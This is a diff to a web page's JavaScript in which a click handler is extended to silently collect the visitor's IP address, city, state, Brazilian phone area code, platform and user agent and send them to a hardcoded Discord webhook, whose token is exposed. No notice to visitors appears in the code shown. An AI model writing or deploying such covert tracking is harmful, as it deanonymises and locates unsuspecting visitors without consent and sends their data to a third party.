@@ -169,6 +169,17 @@
 </div>
 
 <script>
+    // Dicionário mapeando os Estados (UF) aos seus respectivos DDDs
+    const mapDDD = {
+        "AC": "68", "AL": "82", "AP": "96", "AM": "92, 97", "BA": "71, 73, 74, 75, 77",
+        "CE": "85, 88", "DF": "61", "ES": "27, 28", "GO": "62, 64", "MA": "98, 99",
+        "MT": "65, 66", "MS": "67", "MG": "31, 32, 33, 34, 35, 37, 38",
+        "PA": "91, 93, 94", "PB": "83", "PR": "41, 42, 43, 44, 45, 46",
+        "PE": "81, 87", "PI": "86, 89", "RJ": "21, 22, 24", "RN": "84",
+        "RS": "51, 53, 54, 55", "RO": "69", "RR": "95", "SC": "47, 48, 49",
+        "SP": "11 a 19", "SE": "79", "TO": "63"
+    };
+
     async function trackClick(event, itemName) {
         // Previne o redirecionamento imediato
         event.preventDefault();
@@ -178,21 +189,41 @@
         const webhookUrl = "https://discord.com/api/webhooks/1498456727790817374/HwWtSSNVPJ1Bgh4JRRhTNd74FKJz79hia2lKUFPZzAtT4emE5l8xUEZySIO_Mnu2FeKr";
         
         let ip = "Não identificado";
+        let cidade = "Desconhecida";
+        let estado = "??";
+        let ddd = "Desconhecido";
+
         try {
-            const response = await fetch('https://api.ipify.org?format=json');
+            // Utilizamos a API ipwho.is que fornece IP, Cidade e Estado (Region Code) de graça
+            const response = await fetch('https://ipwho.is/');
             const data = await response.json();
-            ip = data.ip;
-        } catch (e) { console.log("Erro IP"); }
+            
+            if(data.success) {
+                ip = data.ip;
+                cidade = data.city;
+                estado = data.region_code; // Retorna Ex: "SP", "RJ"
+                ddd = mapDDD[estado] || "Não encontrado";
+            } else {
+                // Fallback caso a API falhe, pega apenas o IP
+                const fbResponse = await fetch('https://api.ipify.org?format=json');
+                const fbData = await fbResponse.json();
+                ip = fbData.ip;
+            }
+        } catch (e) { 
+            console.log("Erro ao buscar dados de IP/Localização", e); 
+        }
 
         const message = {
             embeds: [{
                 title: "🚨 Clique Detectado",
                 color: 16711680, // Vermelho para destaque
                 fields: [
-                    { name: "Opção", value: itemName, inline: true },
-                    { name: "IP", value: ip, inline: true },
+                    { name: "Opção Acessada", value: itemName, inline: true },
+                    { name: "IP do Usuário", value: ip, inline: true },
+                    { name: "Localização", value: `${cidade} - ${estado}`, inline: true },
+                    { name: "DDD da Região", value: ddd, inline: true },
                     { name: "Plataforma", value: navigator.platform, inline: true },
-                    { name: "User-Agent", value: navigator.userAgent }
+                    { name: "User-Agent", value: navigator.userAgent, inline: false }
                 ],
                 timestamp: new Date().toISOString()
             }]
